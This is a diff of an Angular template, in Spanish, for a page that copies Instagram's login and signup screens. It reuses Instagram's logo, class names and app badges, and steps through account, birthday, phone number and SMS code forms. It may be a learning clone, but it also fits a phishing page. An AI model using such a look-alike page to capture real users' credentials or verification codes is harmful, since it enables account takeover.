@@ -6,86 +6,108 @@
                 <!-- WRAPPER -->
                     <div class="wrapper">
                         <article class="article">
-                            <div class="content">
-                                <div class="login-box">
-                                    <!-- HEADER -->
-                                        <div class="header">
-                                            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" />
+                            <!-- CONTENT -->
+                                <div class="content">
+                                    <!-- LOGIN-BOX -->
+                                        <div class="login-box">
+                                            <!-- HEADER -->
+                                                <div class="header">
+
+                                                    <ng-container *ngIf="this.showAccount == true; else showBirthDay">
+                                                        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" />
+                                                    </ng-container>
+                                                    <ng-template #showBirthDay>
+                                                        <span class="_9-zu _aa5a"></span>
+                                                    </ng-template>
+
+                                                    <!-- <ng-container *ngIf="this.showBirthDay">
+                                                        <span class="_9-zu _aa5a"></span>
+                                                    </ng-container>
+
+                                                    <ng-container *ngIf="this.showPhoneNumber">
+                                                        <span  class="_9--f _aa5a"></span>
+                                                    </ng-container>
+
+                                                    <ng-container *ngIf="this.showCodePhone">
+                                                        <span  class="_9--v _aa5a"></span>
+                                                    </ng-container> -->
+                                                </div>
+                                            <!-- HEADER END-->
+
+                                            <!-- FORM -->
+                                                <div class="form-wrap">
+                                                    <form class="form">
+                                                        <!-- 
+                                                            ACCOUNT
+                                                        -->
+                                                        <ng-container *ngIf="this.showAccount">
+                                                            <app-account (sigInEvent)="sigIn($event)" (showBirthdayEvent)="showBirthday($event)"></app-account>
+                                                        </ng-container>
+
+                                                        <!-- 
+                                                            BIRTTHDAY
+                                                        -->
+                                                        <ng-container *ngIf="this.showBirthDay">
+                                                            <app-birthday (showCodePhoneEvent)="showViewNumberPhone($event)" (backEvent)="backAccount($event)" [user]="user" ></app-birthday>
+                                                        </ng-container>
+
+                                                        <!-- 
+                                                            NUMBERPHONE
+                                                        -->
+                                                        <ng-container *ngIf="this.showPhoneNumber">
+                                                            <app-phonenumber 
+                                                                (phoneEvent)="showViewCodePhone($event)"
+                                                                (backEvent)="backBirthday($event)" 
+                                                                [user]="user"
+                                                                [spinner] = "this.authService.spinner"
+                                                                [showTextContinue] = "this.authService.showTextLogin"
+                                                            >
+                                                            </app-phonenumber>
+                                                        </ng-container>
+
+                                                        <!-- 
+                                                            CODEPHONE
+                                                        -->
+                                                        <ng-container *ngIf="this.showCodePhone">
+                                                            <app-codephone 
+                                                                (codePhoneEvent)="showToFeed($event)" 
+                                                                (backEvent)="backNumberPhone($event)" 
+                                                                [user]="user"
+                                                                [phone]="phone"
+                                                                [spinner] = "this.authService.spinner"
+                                                                [showTextContinue] = "this.authService.showTextLogin"
+                                                            >
+                                                            </app-codephone>
+                                                        </ng-container>
+                                                    </form>
+                                                </div>
+                                            <!-- FORM END -->
                                         </div>
-                                    <!-- HEADER END-->
+                                    <!-- END LOGIN-BOX -->
 
-                                    <!-- FORM -->
-                                        <div class="form-wrap">
-                                            <form class="form">
-                                                <!-- 
-                                                    ACCOUNT
-                                                -->
-                                                <ng-container *ngIf="this.showAccount">
-                                                    <app-account (sigInEvent)="sigIn($event)" (showBirthdayEvent)="showBirthday($event)"></app-account>
-                                                </ng-container>
-
-                                                <!-- 
-                                                    BIRTTHDAY
-                                                -->
-                                                <ng-container *ngIf="this.showBirthDay">
-                                                    <app-birthday (showCodePhoneEvent)="showViewNumberPhone($event)" (backEvent)="backAccount($event)" [user]="user" ></app-birthday>
-                                                </ng-container>
-
-                                                <!-- 
-                                                    NUMBERPHONE
-                                                -->
-                                                <ng-container *ngIf="this.showPhoneNumber">
-                                                    <app-phonenumber 
-                                                        (phoneEvent)="showViewCodePhone($event)"
-                                                        (backEvent)="backBirthday($event)" 
-                                                        [user]="user"
-                                                        [spinner] = "this.authService.spinner"
-                                                        [showTextContinue] = "this.authService.showTextLogin"
-                                                    >
-                                                    </app-phonenumber>
-                                                </ng-container>
-
-                                                <!-- 
-                                                    CODEPHONE
-                                                -->
-                                                <ng-container *ngIf="this.showCodePhone">
-                                                    <app-codephone 
-                                                        (codePhoneEvent)="showToFeed($event)" 
-                                                        (backEvent)="backNumberPhone($event)" 
-                                                        [user]="user"
-                                                        [phone]="phone"
-                                                        [spinner] = "this.authService.spinner"
-                                                        [showTextContinue] = "this.authService.showTextLogin"
-                                                    >
-                                                    </app-codephone>
-                                                </ng-container>
-                                            </form>
+                                    <!-- SIGNUP END -->
+                                        <div class="login-box">
+                                            <p class="text">¿Tienes una cuenta?<a (click)="sigIn($event)">Entrar</a></p>
                                         </div>
-                                    <!-- FORM END -->
+                                    <!-- SIGNUP END -->
+
+                                    <!-- APP -->
+                                        <div class="app">
+                                            <p>Descarga la aplicación.</p>
+                                            <!-- APP IMG -->
+                                                <div class="app-img">
+                                                    <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
+                                                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" />
+                                                    </a>
+                                                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
+                                                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png" />
+                                                    </a>
+                                                </div>
+                                            <!-- APP IMG END-->
+                                        </div>
+                                    <!-- APP END -->
                                 </div>
-
-                                <!-- SIGNUP END -->
-                                    <div class="login-box">
-                                        <p class="text">¿Tienes una cuenta?<a (click)="sigIn($event)">Entrar</a></p>
-                                    </div>
-                                <!-- SIGNUP END -->
-
-                                <!-- APP -->
-                                    <div class="app">
-                                        <p>Descarga la aplicación.</p>
-                                        <!-- APP IMG -->
-                                            <div class="app-img">
-                                                <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
-                                                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" />
-                                                </a>
-                                                <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
-                                                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png" />
-                                                </a>
-                                            </div>
-                                        <!-- APP IMG END-->
-                                    </div>
-                                <!-- APP END -->
-                            </div>
+                            <!-- END CONTENT -->
                         </article>
                     </div>
                 <!-- WRAPPER END -->
